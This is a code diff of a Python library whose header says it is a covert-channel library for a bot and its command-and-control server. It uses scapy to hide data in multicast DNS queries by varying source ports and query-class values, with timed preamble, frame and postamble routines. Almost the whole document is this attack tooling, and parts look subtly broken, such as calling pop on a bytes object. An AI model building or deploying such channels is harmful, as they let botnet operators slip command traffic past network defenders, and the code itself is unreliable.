@@ -1,22 +1,24 @@
 #!/usr/bin/python3
 # Covert Channel Communication Library for bot and c2 to use
+import bitarray
 from scapy import packet
 from scapy.arch import get_if_addr
 from scapy.config import conf
 from scapy.layers.dns import DNS
 from scapy.layers.inet import IP, UDP
-import bitarray
 from scapy.sendrecv import send
+import time
 
 
 def mkpkt(srcprt: int, qclass: int) -> packet.Packet:
+    # TODO: make sure setting broadcast IP is enough or if we need to set broadcast MAC too
     myip = get_if_addr(conf.iface)
     # Construct query from raw bytes
     query = DNS(b'\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\t_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c'
                 b'\x00\x01')
     # set qclass to checksum fragment value
     query.qd.qclass = qclass
-    # construct new packet and send it
+    # construct new packet and send it to broadcast addr
     return IP(src=myip, dst="224.0.0.251") / UDP(sport=srcprt, dport="mdns") / query
 
 
@@ -41,7 +43,7 @@ def calcsum(inp: str):
     return bits
 
 
-class message:
+class Message:
     def __init__(self, string: str):
         self.bytes = bytes(string, "utf8")
         self.checksum = calcsum(string)
@@ -49,6 +51,9 @@ class message:
 
     def preamble(self):
         # Transmit 0xAA 0xFF 0xAA 0xFF
+        while round(time.time(), 2) - round(time.time()) != 0.0:
+            # wait until next second to start transmission
+            time.sleep(0.005)
         for i in range(0, 4):
             mask = i % 2
             for b in range(0, 8):
@@ -65,6 +70,36 @@ class message:
                         qclass = 3
                     case [1, 1]:
                         qclass = 4
-
+                # build packet and send it
                 p = mkpkt(self.base_port + b, qclass)
                 send(p)
+
+    def postabmle(self):
+        # Transmit 0xFF 0xAA 0xFF 0xAA
+        for i in range(0, 4):
+            mask = i % 2
+            time.sleep(0.25)
+            for b in range(0, 8):
+                if b % 2 == mask:
+                    continue
+                p = mkpkt(self.base_port + b, 255)
+                send(p)
+
+    def send(self):
+        self.preamble()
+        while len(self.bytes) != 0:
+            # Wait 1/4 second for next frame (synchronized by preamble)
+            time.sleep(0.25)
+            for i in range(0, 8):
+                try:
+                    payload = self.bytes.pop(0)
+                except IndexError:  # shouldn't ever happen since we converted from bytes
+                    break
+                # Don't transmit packet if payload is 0
+                if payload == 0:
+                    continue
+                p = mkpkt(self.base_port+i, 1)
+                send(p)
+        self.postabmle()
+        print("Done transmitting!")
+
